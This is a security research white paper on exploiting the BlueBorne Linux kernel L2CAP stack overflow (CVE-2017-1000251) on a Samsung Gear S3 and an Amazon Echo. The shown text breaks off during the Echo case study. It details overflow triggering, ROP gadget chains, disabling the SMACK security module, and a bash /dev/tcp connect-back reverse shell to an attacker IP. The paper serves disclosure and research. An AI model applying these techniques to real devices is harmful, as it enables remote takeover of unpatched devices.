Exploiting BlueBorne in Linux-based IoT devices
Ben Seri & Alon Livne

Preface

3

Brief Bluetooth Background

4

L2CAP

4

Overview

4

Mutual configuration

5

Linux kernel RCE vulnerability - CVE-2017-1000251

6

Impact

8

Exploitation

9

Case Study #1 - Samsung Gear S3

9

Extracting the smartwatch kernel

9

Leveraging stack overflow into PC control

10

From kernel to user-mode

13

Aarch64 Return-Oriented-Programming

13

Structural considerations

14

SMACK

19

Case Study #2 - Amazon Echo

22

Getting out of bounds

23

Analyzing the stack

23

Developing Write-What-Where

25

Putting it all together

27

Case Study #n - Defeating modern mitigations

28

A new information leak vulnerability in the kernel

28

Conclusions

30

BlueBorne on Linux  |  © 2017 ARMIS  |  2

Preface
In September 2017 the BlueBorne attack vector was disclosed by Armis Labs. BlueBorne allows attackers to leverage Bluetooth connections to penetrate and take complete control over targeted devices. Armis Labs has identified 8 vulnerabilities related to this attack vector, affecting four operating systems, including Windows, iOS, Linux, and Android.
Previous white papers on BlueBorne were published as well:  The dangers of Bluetooth implementations detailed the overall research, the attack surface, and the discovered vulnerabilities.  BlueBorne on Android detailed the exploitation process of the BlueBorne vulnerabilities on Android.
This white paper will elaborate upon the Linux RCE vulnerability (CVE-2017-1000251) and its exploitation. The exploitation of this vulnerability will be presented on two IoT devices - a Samsung Gear S3 Smartwatch, and the Amazon Echo digital assistant.
Following the disclosure of the BlueBorne Linux vulnerabilities, patches have been committed to the Linux Kernel (here) and the BlueZ userspace project (here). Recently, we discovered another information leak vulnerability in the Linux Kernel and reported it to Linux, which issued a patch for it as well. This vulnerability allows an attacker to bypass mitigations that may exist on Linux machines, although in the case of IoT this may never be necessary since they do not have such mitigations in the first place. These mitigations include KASLR (Kernel Address Space Layout Randomization) and Stack Protectors.
In our initial findings, published in September, we stated that the Linux RCE vulnerability affects all Linux Kernel versions starting at v3.3-rc1 and on. Since then, we have also found a way to exploit this vulnerability in older Linux Kernels, starting at v2.6.32 and on, as we will present below in the demonstration of the Amazon Echo exploit (which uses Kernel v2.6.37).
Accompanying this whitepaper is an exploit source code for these vulnerabilities, and the testing framework used to exploit them, both of which are published here. The testing framework  was used to inject raw L2CAP packets - which was a necessary tool to exploit these vulnerabilities. This framework can be used by other researchers to better test and audit the various implementations of the lower layers of Bluetooth (ACL, L2CAP, etc.).
To fully understand the underlying facilities that allow exploitation of the Linux vulnerabilities, we strongly recommend reading the full technical white paper, and especially the following sections: Demystifying Discoverability, SDP and L2CAP.
However, a short recap is provided here as well.
BlueBorne on Linux  |  © 2017 ARMIS  |  3

Brief Bluetooth Background
The Bluetooth stack architecture Bluetooth is the dominating protocol today for short-range communications. It was introduced in 1998, and today approximately 8.2 billion devices use Bluetooth. The Bluetooth implementation in Linux is called BlueZ and it exists in Linux since 2001. Linux is one of the first operating systems to support Bluetooth natively, as an integral part of the OS. Since Linux is an open source OS it is also used as the foundation for various OSs such as Samsung's Tizen OS, Amazon's Fire OS, and others. The majority of IoT devices today are using Linux as the underlying OS, either natively or as an underlying foundation, and so an IoT device that supports Bluetooth will most likely be using BlueZ as its Bluetooth stack.
L2CAP
Overview
One of the lowest layers of any Bluetooth stack is L2CAP, responsible for managing connections to the various Bluetooth services. L2CAP is Bluetooth's equivalent of TCP, as it manages connections to the various services that exist in a Bluetooth stack, and provides some QoS features for these connections. When creating a new L2CAP connection, the two endpoints attempt to coordinate a concerted configuration by passing packets called configuration requests and configuration responses back and forth. A configuration request contains several elements which determine the exact type of connection features which will be used.
BlueBorne on Linux  |  © 2017 ARMIS  |  4

Mutual configuration
The configuration process takes place using configuration requests and responses, referred to in the specification as L2CAP_ConfReq and L 2CAP_ConfResp messages. These messages are passed on the signaling channel, with both endpoints dispatching configuration requests to one another as part of the initial handshake, and replying with configuration responses. The configuration response contains a status code which informs the initiator whether his configuration was accepted or rejected. Each endpoint negotiates its own configuration, meaning the configuration parameters of both endpoints need to be agreed upon.
Excerpt from Bluetooth Spec, page 1902
In the example above , Device A requests a Maximum Transmission Unit (MTU) of 0x100, which Device B accepts, followed by a request from Device B for an MTU of 0x200, which Device A accepts as well. Two MTU parameters were agreed upon in this transaction - the maximum message size of outgoing messages from Device A to Device B is 0x100, and the  the maximum message size of outgoing messages from Device B to Device A is 0x200. While the above example is a simple exchange of parameters, a device might also choose to reject an offered configuration request due to "unacceptable parameters". To ease re-negotiation, its configuration response may contain an alternative, acceptable value for the parameter it wishes to change. For example, in the following code-snippet (from BlueZ), the requested MTU value is checked against a minimum value (chan->omtuis initialized to a default value when the connection is established): 3406if(mtu<L2CAP_DEFAULT_MIN_MTU) 3407result=L2CAP_CONF_UNACCEPT; 3408else{ 3409chan->omtu=mtu;
BlueBorne on Linux  |  © 2017 ARMIS  |  5

3410set_bit(CONF_MTU_DONE,&chan->conf_state); 3411} 3412l2cap_add_conf_opt(&ptr,L2CAP_CONF_MTU,2,chan->omtu);
Excerpt from net/bluetooth/l2cap_core.c
If the requested MTU value is valid, it is committed to the current connection settings and the MTU configuration state is marked as CONF_MTU_DONE in the channel object, otherwise, the reply value is set to UNACCEPT and the value is discarded. In either case, an MTU element is added to the configuration response, reflecting a valid setting to the other side if the configuration is rejected.
The above procedure is called "The standard configuration process" of L2CAP connections. In this configuration process the endpoints will respond to a configuration request with a response that either accepts or rejects the offered configuration. If a configuration was rejected, the endpoints will continue to negotiate until they reach an agreed upon configuration.
However another type of configuration process exists - the lockstep configuration process. This process is required to facilitate the Extended Flow Specification ( EFS) feature of L2CAP, which allows devices to establish a more comprehensive connection. The EFS feature parameters will need to be validated with each endpoint's local Bluetooth controller, and so the endpoint's response to a configuration request may be "Pending". Once both EFS parameters have been exchanged between the endpoints, and the validation of EFS was achieved, a final response will be returned by each of the endpoints.
Linux kernel RCE vulnerability - CVE-2017-1000251
The vulnerability lies in BlueZ's parsing of incoming configuration response packets in l2cap_parse_conf_rsp, which was introduced in kernel version v2.6.32, and thus affects all version from there on. l2cap_parse_conf_rsp can be seen here in abbreviated form: staticintl2cap_parse_conf_rsp(structl2cap_chan*chan,void*rsp,intlen, void*data,u16*result)  { structl2cap_conf_req*req=data; void*ptr=req->data; //... while(len>=L2CAP_CONF_OPT_SIZE){ len-=l2cap_get_conf_opt(&rsp,&type,&olen,&val);
switch(type){ caseL2CAP_CONF_MTU: //ValidateMTU... l2cap_add_conf_opt(&ptr,L2CAP_CONF_MTU,2,chan->imtu); break;
BlueBorne on Linux  |  © 2017 ARMIS  |  6

caseL2CAP_CONF_FLUSH_TO: chan->flush_to=val; l2cap_add_conf_opt(&ptr,L2CAP_CONF_FLUSH_TO, 2,chan->flush_to); break;
//...          }      } //... returnptr-data;  }
Excerpt from l2cap_parse_conf_rsp (net/bluetooth/l2cap_core.c)
This function receives a configuration response buffer in the r sp argument, and its length in the len argument. It extracts elements from the buffer one by one using the l 2cap_get_conf_opt function, until the len argument runs out. Each element it unpacks from the configuration response is validated and then packed back onto a response buffer, which is pointed to by the data argument. However, the size of this response buffer is not passed into the function. Essentially, all elements in the rsp would be copied onto the data buffer via &ptr (offset to l2cap_conf_req.data) regardless of the target's buffer size.
Note that the size of the incoming response is not limited - elements can be duplicated, which allows an attacker to control the size of the rsp buffer, and as a result the amount of data copied onto data. The origin of the data buffer - l2cap_parse_conf_rsp is called from two locations, both in a function called l2cap_config_rsp, which, as its name implies, handles configuration response messages. Both invocations are similar, so both can be used to exploit this vulnerability, as we will show with two exploit examples (Samsung Gear S3, and Amazon Echo).
switch(result){ caseL2CAP_CONF_SUCCESS: ... break;
caseL2CAP_CONF_PENDING: set_bit(CONF_REM_CONF_PEND,&chan->conf_state); if(test_bit(CONF_LOC_CONF_PEND,&chan->conf_state)){ charbuf[64]; len=l2cap_parse_conf_rsp(chan,rsp->data,len, buf,&result); ... gotodone;
Excerpt from l2cap_config_rsp (net/bluetooth/l2cap_core.c)
BlueBorne on Linux  |  © 2017 ARMIS  |  7

The switch examines the result value, which was previously unpacked from the configuration response packet, and can thus be controlled by an attacker. The response buffer is a small stack buffer, called buf, declared in the scope of the if statement which leads to the call.
In the above excerpt, the configuration for the current channel is then tested for the "Pending" state (as described above in the lockstep configuration process). So to access this flow, an attacker needs his target to be in the "Pending" state, which he can achieve by triggering the following code path:
  if(remote_efs){ if(chan->local_stype!=L2CAP_SERV_NOTRAFIC&& efs.stype!=L2CAP_SERV_NOTRAFIC&& efs.stype!=chan->local_stype){ ...//Wedon'twantthisbranch,easytoavoid }else{ /*SendPENDINGConfRsp*/ result=L2CAP_CONF_PENDING; set_bit(CONF_LOC_CONF_PEND,&chan->conf_state);              }          }
Excerpt from l2cap_parse_conf_req (net/bluetooth/l2cap_core.c)
This action is simple - an attacker only needs to send a configuration request with an EFS element, setting the stype field to L 2CAP_SERV_NOTRAFIC. After the "Pending" state is reached, the next configuration response sent with the result field set to L2CAP_CONF_PENDING will trigger the vulnerability in this flow, leading buf[64] to be overwritten with an arbitrarily sized buffer.
This vulnerability allows an attacker to overflow a 64 byte buffer on the kernel stack by an unlimited amount of data, so long as it conforms to the structure of a valid L2CAP configuration response.
Impact
In BlueZ's case, L2CAP is included as part of the core Linux kernel code. This is a rather dangerous choice. Combining a fully exposed communication protocol, arcane features like EFS and a kernel space implementation is a recipe for trouble. This vulnerability is a classic stack overflow occurring in the context of a kernel thread. As we will demonstrate with the devices we exploited, the most common case in IoT devices today is a complete lack of mitigations against stack overflows in their kernels. Moreover, when combining this vulnerability with another vulnerability that leaks data from the stack (as the one presented below), also means all unpatched Linux devices are susceptible to complete take over using this vulnerability and its likes - even if they use stack protectors, or KASLR in their kernel builds.
BlueBorne on Linux  |  © 2017 ARMIS  |  8

So this vulnerability could provide an attacker with a full and reliable kernel-level exploit for any Bluetooth enabled device running Linux, requiring no additional steps. Moreover, each compromised host can be used to launch secondary attacks, making this vulnerability wormable.
Exploitation
We chose to exploit two real-life consumer devices to evaluate what it takes to use this vulnerability to a complete takeover these devices. Both devices use the BlueZ stack - but since they are based on different kernel versions, and since they run on different processors, they required different exploits.
Case Study #1 - Samsung Gear S3
The first case study we chose to exploit is the Smasung Gear S3.
The Gear S3 runs Tizen, Samsung's own mobile OS. The unit that we tested was running the Tizen v2.3.2.1 that is based on the Linux kernel v3.18, on a Dual Core Exynos 7270 Aarch64 (64bit ARM) processor.
Extracting the smartwatch kernel
To start analyzing the stack frame of the vulnerable function, we had to extract the kernel which was actually running on the smart watch. The Tizen SDK's debugger tool - SDB - provides shell access to the watch, running as the "developer" user. There is no legitimate way to gain root privileges on the Gear S3, so we opted to use a public local privilege escalation exploit to help us achieve root permissions. We modified a PoC version of CVE-2016-5195 (DirtyCOW) called DirtyCOWTester to overwrite a binary belonging to one of the daemons running on the smartwatch, allowing us to run arbitrary commands with root privilege. Using this method, we modified the file permissions on the /dev/mmcblk* device nodes to allow us to read from the flash memory freely. We then checked each partition that was of appropriate size and not already mounted, and eventually hit the one where the kernel was located. sh-3.2#lsblk NAMEMAJ:MINRMSIZEROTYPEMOUNTPOINT loop07:0042.3M1loop/usr/share/locale zram0254:00349M0disk[SWAP] mmcblk0rpmb179:240512K0disk ... |-mmcblk0p7179:703M0part
BlueBorne on Linux  |  © 2017 ARMIS  |  9

|-mmcblk0p8259:0016M0part |-mmcblk0p9259:1016M0part |-mmcblk0p10259:2016M0part/lib/modules |-mmcblk0p11259:30190M0part/opt/system/csc ...
The kernel was found in mmcblk0p8
We dumped the entire partition and loaded the dump in IDA, rebasing correctly with the help of offsets from /proc/kallsyms which was readily available:
kallsyms taken from the smartwatch (truncated)
Leveraging stack overflow into PC control
Since this is a fairly standard stack overflow, our plan was to overwrite some function pointer or if possible the return address of our function. Two factors made the task at hand quite simple:
1. Stack-canary protection was not enabled on this kernel. 2. The target buffer was pushed to the very edge of the stack frame - adjacent to the
non-existent stack canary. This is caused by gcc's FORTIFY_SOURCE feature which is usually combined with a stack canary protection which is enabled. This is meant to ensure that if an overflow occurs, the attacker would have to overflow the stack canary before reaching any other stack variables to overflow.
The combination of these two factors lead to an ironic turn-of-fate - the first overflowed byte of the target buffer would be the stack frame itself - leading to PC control. In 64 bit ARM (Aarch64), the stack frame is arranged so the previous return address and stack-frame pointer are stored at the "bottom" of the current stack frame, followed by saved registers, and then by the current function's stack variables/buffers. To provide some context - in Aarch64, the x29 and x30 registers are used to store the current functions frame pointer and return address. A ret instruction could also be viewed as branching to x30. Registers are stored on the stack using the stp/strand ldp/ldr instructions. These instructions are also able to add or subtract from the address register, for pop/push functionality.
BlueBorne on Linux  |  © 2017 ARMIS  |  10

Excerpt from the Programmer's Guide to ARMv8-A
Consider the following instructions, a function epilogue and prologue:
   Typical function prologue

Typical function epilogue

Upon entering a function, 0x40 bytes are subtracted from SP to create a stack frame (note the `!' in the first stpinstruction), and the x29 and x30 registers are stored at the "base" of this frame. The rest of the saved registers are stored directly after, creating the following stack layout

-0x08

freestack

SP

savedframepointer-x29

+0x08

savedreturnaddress-x30

+0x10

savedx19

+0x18

savedx20

+0x20

savedx21

+0x28

savedx22

+0x30 +0x38

stackvars

+0x40

previousstackframe

So, a stack overflow will result in overwriting the previous stack frame and the return address of the function directly above us in the call stack. Remember that the buffer we're overflowing does not belong to the function where the overflow occurs, but rather to the function that called it. In addition, since most functions in this code path are declared as inline, the buffer we're
BlueBorne on Linux  |  © 2017 ARMIS  |  11

overwriting in l2cap_parse_conf_rspis actually declared as part of l2cap_recv_frame's stack frame, which itself was called by l2cap_recv_acldata- so we'll be overwriting l2cap_recv_acldata's return address into hci_rx_work.

l2cap_parse_conf_rsp

savedframe,ret,andregisters

l2cap_recv_frame l2cap_recv_acldata

savedframe,ret,andregisters stackvars
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAtargetbuffer-buf[64]AAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
previousstackpointer-x29
returnaddress->hci_rx_work

BlueBorne on Linux  |  © 2017 ARMIS  |  12

From kernel to user-mode
We are now able to achieve PC control, inside of a kernel work-queue thread. Pivoting from kernel to user-mode in the Linux kernel turned out to be fairly straightforward, thanks to a construct called user-mode helpers. User-mode helpers are used in several places in the Linux kernel to execute commands in user-mode, such as:
 Loading kernel modules using modprobe - call_modprobe - kernel/kmod.c  Shutdown/reboot commands - __orderly_poweroff/reboot- kernel/reboot.c
The function call_usermodehelper provides an interface similar to execve:
intcall_usermodehelper(constchar*path, char**argv, char**envp, intwait);
In newer versions of Linux, you can even find a nifty wrapper in kernel/reboot.c called run_cmd, which will call argv_spliton your behalf and even handle the envp parameter before invoking call_usermodehelper.
staticintrun_cmd(constchar*cmd) { ...//argv_splitandcall_usermodehelper }
In our version of the kernel this function does not exist, but the _ _orderly_poweroffand __orderly_reboot functions execute similar logic (argv_splitand call_usermodehelper) on pre-defined strings. If we can overwrite one of these pre-defined strings and then invoke its respective function, we should be able to execute an arbitrary command in user-mode, with existing code doing all the heavy lifting for us. Luckily, the poweroff_cmd string that is run by __orderly_poweroffis located in writeable memory, on account of being mapped to /proc for modifications from user-mode. We did however had to make sure that the force argument for _ _orderly_poweroffwas set to false, to avoid actually shutting down the device.
staticint__orderly_poweroff(boolforce) { ...//argv_splitandcall_usermodehelperonpoweroff_cmd }
Aarch64 Return-Oriented-Programming
At this point, we have PC and stack control. Since Kernel base randomization (KASLR) was not enabled on this kernel (as is common to most kernels prior to v4.12) - all that was left at this point is to assemble a ROP chain.
BlueBorne on Linux  |  © 2017 ARMIS  |  13

Traditionally, we would try to leverage ROP execution into shellcode execution in kernel-mode. In the case of this PoC, our goal was to export a connectback shell over the WiFi network. Since this could be accomplished with relative ease in user-mode, we elected to "skip" the shellcode part and stick with ROP execution for our pivot to user-mode. Having already extracted a copy of the kernel and rebased it correctly with the help of /proc/kallsyms, all that remains is finding gadgets to help us perform the following actions:
1. Overwrite the poweroff_cmd string with our own command. 2. Invoke __orderly_poweroff, with the force argument set to 0.
a. Set x0 (the first argument register) to 0. b. Call __orderly_poweroff(false). 3. Restore or stop execution of the running thread.
The size of the ROP chain turned out to be an important consideration in this architecture, since the vast majority of function epilogues remove two 64 bit words from the stack into x29 and x30. This means that the minimum size added to the payload for even a basic gadget is 16 bytes. Any register pair (or even a single register, due to padding) added to the gadget would cost an additional 16 bytes.

Small function epilogue
Structural considerations
The biggest challenge in assembling a functional ROP chain was the fact that it also has to be formatted as a series of valid configuration elements - an invalid element would cause the copy loop in l2cap_parse_conf_rspto break. Most of the elements parsed by the loop are 2 bytes in size, discounting the 2 byte l2cap_conf_opt header. There are also two larger elements described by the EFS (extended flow) and RFC (retransmission and flow-control) structs, the former being the larger of the two:

structl2cap_conf_opt{ __u8type; __u8len; __u8val[0]; }__packed;

structl2cap_conf_efs{ __u8id; __u8stype; __le16msdu; __le32sdu_itime; __le32acc_lat; __le32flush_to; }__packed;

Excerpts from include/net/bluetooth/l2cap.h

BlueBorne on Linux  |  © 2017 ARMIS  |  14

We chose to utilize the EFS structure, packing our ROP chain inside its members, since only one of the struct's fields is examined as part of the copy loop - the s typemember:

caseL2CAP_CONF_EFS: if(olen==sizeof(efs)) memcpy(&efs,(void*)val,olen);
if(chan->local_stype!=L2CAP_SERV_NOTRAFIC&& efs.stype!=L2CAP_SERV_NOTRAFIC&& efs.stype!=chan->local_stype) return-ECONNREFUSED;
l2cap_add_conf_opt(&ptr,L2CAP_CONF_EFS,sizeof(efs), (unsignedlong)&efs); break;
Excerpt from l2cap_parse_conf_rsp (net/bluetooth/l2cap_core.c)

If the stype field is set to L2CAP_SERV_NOTRAFIC (which is defined as 0), we can avoid the -ECONNREFUSEDpath regardless of the other conditions. The s type is the 2nd byte of the EFS struct. This leaves us with 14 bytes that we fully control inside the structure, enough for a single 64 bit pointer and some change:
l2cap_conf_opt + l2cap_conf_efs

type len id stype msdu

sdu..

06

10 XX

00 XXXX XXXX

..._itime XXXX

acc_lat XXXXXXXX

flush... XXXX

..._to XXXX
opt header + EFS struct - The green XXs represent bytes in our control
If we chain several of these EFS elements in succession - we arrive at the following stack control pattern:
0000:1 06 10 XX 00 XX XX XX XX

0008:2 XX XX XX XX XX XX XX XX

0010:3 XX XX 06 10 XX 00 XX XX

0018:4 XX XX XX XX XX XX XX XX

0020:5 XX XX XX XX 06 10 XX 00

0028:6 XX XX XX XX XX XX XX XX

BlueBorne on Linux  |  © 2017 ARMIS  |  15

0030:7 XX XX XX XX XX XX 06 10 0038:8 XX 00 XX XX XX XX XX XX 0040:9 XX XX XX XX XX XX XX XX

If observed as a 9 word long ROP chain - we only fully control every other word for the first 6 words, followed by 2 partially-controlled words and 1 more fully controlled word. However, recall that the typical gadget pops pairs of registers off the stack - so this sparse control pattern actually works out quite nicely for us, even without using the 8th word. For example, consider the way the following chain of gadgets applies to our control pattern:

x29 Notcontrolled

ldpx19,x20,[sp,#0x10]; x30 Controlled

ldpx29,x30,[sp],#0x20;

ret;pop2registers

x19 Notcontrolled

x20 Controlled

x29 Notcontrolled

x30 Controlled ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; x19 Notcontrolled ldpx29,x30,[sp],#0x30; x20 Notcontrolled ret;pop4registers
x21 Controlled

x22 Notcontrolled

x29 Controlled

ldpx19,x20,[sp,#0x10]; x30 Notcontrolled

ldpx29,x30,[sp],#0x20;

ret;pop2registers

x29 Controlled

x30 Notcontrolled

As you can see, while we do not fully control the content of the odd numbered registers (x29, x19), we do have full control of the even registers (x30, x20). However, this "polarity" is reversed in the middle of the chain on account of the two consecutively uncontrolled words.

BlueBorne on Linux  |  © 2017 ARMIS  |  16

Another way to look at this is because the EFS element is 18 bytes in size, we achieve 8 byte alignment every 4 chained EFS elements ( lcm(0x12, 8)/0x12 = 4 ). This amounts to 9 words. In order to maintain our "polarity" we need 1 more additional word, for an even count.
This is where the MTU element comes to the rescue - it's a 16 bit integer, so together with its l2cap_conf_opt header it is 4 bytes in size. Putting two MTU elements together allows us to carefully weave another 8 byte word into the ROP chain, between two EFS structs - omitting control of an additional word, but evening out the word count and allowing us to reset polarity:

0000:1

06 10 XX 00

0008:2

XX XX XX XX

0010:3

XX XX 06 10

0018:4

XX XX XX XX

0020:5

XX XX XX XX

0028:6

XX XX XX XX

0030:7

XX XX XX XX

0038:8

MTU

01 02

0040:9

XX 00 XX XX

0048:10 XX XX XX XX

0050:11 06 10 XX 00

0058:12 XX XX XX XX

0060:13 XX XX 06 10

0068:14 XX XX XX XX

XX XX XX XX XX 00 XX XX 06 10 XX XX XX XX
MTU XX XX XX XX XX XX XX XX XX 00 XX XX

XX XX x29
XX XX x30 ldpx19,x20,[sp,#0x10]; ldpx29,x30,[sp],#0x20;
XX XX x19 ret;pop2registers
XX XX x20
XX 00 x29
XX XX x30
01 02 x19 ldpx19,x21,[sp,#0x10]; ldpx21,x22,[sp,#0x20];
06 10 x20 ldpx29,x30,[sp],#0x30; ret;pop4registers
XX XX x21
XX XX x22
XX XX x29
XX XX x30 ldpx19,x20,[sp,#0x10]; ldpx29,x30,[sp],#0x20;
XX XX x19 ret;pop2registers
XX XX x20

Thanks to the addition of the two MTU elements (in orange), we are able to maintain an even word count with 8 byte alignment, thus maintaining control of x 30, the link register.
Recalling our plan from before - we now need to overwrite the poweroff_cmd command, located at a predetermined memory location, with our own payload. At first, we attempted to deliver the payload by pulling an additional packet from the socket-buffer queue by calling skb_dequeue, and copy its content onto poweroff_cmd's address, but this idea was quickly forsaken due to the race between the dequeue operation and the packet actually arriving through the Bluetooth stack, which impacted reliability.

BlueBorne on Linux  |  © 2017 ARMIS  |  17

Eventually we decided to simply place the payload string within the ROP chain, copying it 8 bytes at a time to the target address.

The following two gadgets, in succession, allow us to write 8 arbitrary bytes to an arbitrary address, while also maintaining the correct "polarity":

write-what-where

ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; ldpx29,x30,[sp],#0x30; ret;

strx22,[x20,#0x40]; ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; ldpx29,x30,[sp],#0x30; ret;

This equates to *(uint64_t*)(x20 + 0x40) = x22

The only other gadgets we used were to call arbitrary functions, and to null the x0 register using a function call - for the force argument passed to __orderly_poweroff:

function-call(s)

blrx20; ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; ldpx29,x30,[sp],#0x30; ret;

blrx22; ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; ldpx29,x30,[sp],#0x30; ret;

null-x0

blrx2?; ldpx19,x20,[sp,#0x10]; ldpx21,x22,[sp,#0x20]; ldpx29,x30,[sp],#0x30; ret;

movx0,#0; ret;

To end the ROP chain, we elected to simply execute an infinite loop (ret without popping x 30). 1. In our running context (kernel work-queue thread) this works OK, and only affects the Bluetooth kernel work-queue. Restoring proper execution can be achieved relatively easily post-exploitation.
Applying these gadgets to our plan from before, and adding the payload, we end up with the following ROP chain:
2. Multiple write-what-where gadgets to write an arbitrary string to &poweroff_cmd 3. function-callto null-x0(to set the force argument to false) 4. function-callto invoke __orderly_poweroff(false); 5. Endless loop
BlueBorne on Linux  |  © 2017 ARMIS  |  18

The smartwatch's default shell is a bash equivalent, so we simply redirected a bash session to /dev/tcpin the following manner:
/bin/bash-c/bin/bash</dev/tcp/[ip]/[port]
Followed by "execbash-i2>&01>&0"on the now open connectback shell. This helped us minimize the size of the payload as every 8 bytes of string resulted in 0x70 bytes worth of ROP chain.
SMACK
When running the exploit, we encountered issues exporting a root shell. We were able to:
 Touch files in /tmp as root, using the exploit.  Export a connectback shell with bash redirection as the developer user, using the SDB
shell. But we were not able to:
 Export a connectback shell as root, using the exploit.  Receive an incoming connection as root, using the exploit.
So while the exploitation was successful and we were clearly running a command, something else was stopping the connection, among other actions we attempted. After digging around the smartwatch a bit more, we realized that Tizen has S mack enabled by default.
Smack, or Simplified Mandatory Access Control in Kernel, is a Linux Security Module (LSM) which implements access control features. Similar to (but less robust than) SELinux, Smack allows configuration of access control policies in the form of labels or security contexts. In practice - daemons, applications, files, and network locations are demarcated using different labels with well-defined relationships.
To illustrate, let's observe the relationship between the Bluetooth application label and the sound_server
alon@nuc:~$catsmack_rules|grep-ebluetooth|grep-esound_server|grep-vtest sound_servercom.samsung.bluetoothrx com.samsung.bluetoothsound_serverrw
According to these two rules - anything in the com.samsung.bluetoothlabel group may read and write to anything in the sound_server label group. Likewise, objects with the sound_server label may read and execute objects with the com.samsung.bluetoothlabel.
BlueBorne on Linux  |  © 2017 ARMIS  |  19

So under which label are user-mode helpers created? Since the exploit allowed us to touch files anywhere in the filesystem, we touched an empty file somewhere accessible from SDB and examined its label with ls-Z:
alon@nuc:~$../sdbshell sh-3.2$ls-Z/home/hax _/home/hax
The "_" symbol refers to the "floor" label, which is applied to system tasks.

The "floor" label is fairly privileged, however, we were still obstructed by the netlabel feature of Smack, which allows labeling of network addresses.

sh-3.2$cat/smack/netlabel 10.0.2.2/32system::debugging_network 10.0.2.16/32system::debugging_network 127.0.0.1/32-CIPSO 192.168.129.3/32system::debugging_ne... 0.0.0.0/1system::use_internet 128.0.0.0/1system::use_internet

alon@nuc:~/bluetooth$cat../smack_rules|grep -e"system::use_internet"|tail
com.samsung.callsystem::use_internetr clatdsystem::use_internetrw com.samsung.bluetoothsystem::use_internetr fidosystem::use_internetrw

Output from the smartwatch netlabel policy, and corresponding label policies (truncated)
Examining the policy from the smartwatch, we can see that the system::use_internet label is the only one that's fully privileged to access the network, and that several labels are allowed to interact with it. Unfortunately no rule to allow the "floor" label to access the internet were defined, which was what prevented us from exporting a shell from that context, but not from the "sdbd" context under which the SDB shell runs.
As mentioned before, Smack is implemented as a Linux Security Module (LSM) - essentially a set of hooks to instrument relevant APIs. For example, connect and sendmsg are both instrumented to validate the destination address versus the aforementioned netlabel rules.
Fortunately, the Linux kernel provides us with a function to "reset" the currently applied LSM: voidreset_security_ops(void) { security_ops=&default_security_ops; }
This essentially kills the active LSM and disables all its hooks - with one function call. To be fair - Smack is not constructed to fend off an attacker executing code in ring-0, at which point it's usually game-over.

BlueBorne on Linux  |  © 2017 ARMIS  |  20

Applying this knowledge, we added a call to reset_security_opsto our ROP chain using an additional function-call gadget, killing Smack and allowing us to export the coveted connectback shell:
BlueBorne on Linux  |  © 2017 ARMIS  |  21

Case Study #2 - Amazon Echo
The second device we chose to exploit is the Amazon Echo. The Echo runs an ARM 32 bit processor (TI DM3725), and is based on a much older Kernel than the Gear's - Kernel version 2.6.37. Similarly to the Gear, there is no stack protectors in the Kernel's build and no KASLR. Unlike the Gear - there are even fewer mitigations in the Echo: It does not use GCC's FORTIFY_SOURCE, it does not use any LSM modules (like SMACK), and for some unknown reason - it does not have proper use of the NX-bit (!) that is used to prevent execution of data pages as code. This means that once we have control of the PC in this build - we can simply jump to a shell code placed directly on the stack! Just as we did back in the good old days :) Despite these pleasing news that will surely ease exploitation, it appeared the Echo's old kernel version did not yet have the EFS feature in L2CAP that was committed to the kernel only in version 3.3-rc1. At first this seemed quite un-exploitable as the only call to the vulnerable l2cap_parse_conf_rspthat exist in this version of the kernel is this:
switch(result){ ... caseL2CAP_CONF_UNACCEPT: ... charreq[64]; if(len>sizeof(req)-sizeof(structl2cap_conf_req)){ l2cap_send_disconn_req(conn,sk,ECONNRESET); gotodone;         } result=L2CAP_CONF_SUCCESS; len=l2cap_parse_conf_rsp(chan,rsp->data,len,req,&result); ...
Excerpt from l2cap_config_rsp (net/bluetooth/l2cap_core.c)
In the highlighted if above it is apparent that this flow in l2cap_config_rsplimits the incoming configuration response messages to 60 bytes - which would suggest that overflowing the 64 byte reqbuffer would not be possible. However, diving deeper into the implementation of l2cap_parse_conf_rspa new primitive to overcome this limitation arises.
BlueBorne on Linux  |  © 2017 ARMIS  |  22

Getting out of bounds
... while(len>=L2CAP_CONF_OPT_SIZE){ len-=l2cap_get_conf_opt(&rsp,&type,&olen,&val); switch(type){ ... caseL2CAP_CONF_RFC: if(olen==sizeof(rfc)) memcpy(&rfc,(void*)val,olen);
l2cap_add_conf_opt(&ptr,L2CAP_CONF_RFC,sizeof(rfc), (unsignedlong)&rfc); break; ...
Excerpt from l2cap_parse_conf_rsp (net/bluetooth/l2cap_core.c)
In the above excerpt from l2cap_parse_conf_rsp, each time a configuration element is parsed in the while loop l2cap_get_conf_optreturns the olen (element length) and val (element value) of the current element. Regardless of the incoming length of the current element, a configuration element will be appended to configuration response using it's default size. For example, if a configuration element of type L 2CAP_CONF_RFC is parsed in the whileloop, an outgoing element with the same type will be appended with sizeof(rfc) (which is 9 bytes) in it's payload. The if statement in the L2CAP_CONF_RFC case only validates that the memcpyis done for the proper size. So by sending a zero-length RFC element, we can advance the output ptr by 11 bytes (2 header bytes + 9 payload bytes) - but only "spend" 2 bytes for the configuration element's header.

structl2cap_conf_opt{ __u8type; __u8len; __u8val[0]; }__packed;

Zero-LengthRFCconf_opt: \x04(L2CAP_CONF_RFC) \x00

This trick allow us to get out of the reqbuffer's boundaries: Sending the maximum 30 zero-length RFC elements (that will amount to 60 bytes in the configuration response) will create an output configuration request of 330 bytes (11 * 30), which will be substantially past the end of the buffer's size (64 bytes).
Analyzing the stack
Having surpassed the limitations of these new-old code flow, we started analyzing the specific stack frame of the Amazon Echo.

BlueBorne on Linux  |  © 2017 ARMIS  |  23

Although no shell or root method is easily available for the Echo, some research was done on it in the past, and an old image of the Echo is available online. This initial image allowed us to find the kernel image for the Echo, and from there - the stack frame of the vulnerable l2cap_config_rsp- which like the Gear S3 was inlined as part of l 2cap_recv_frame:

Graph overview of l2cap_recv_framein IDA
The stack frame of this function is presented here in abbreviated form:

l2cap_recv_frame

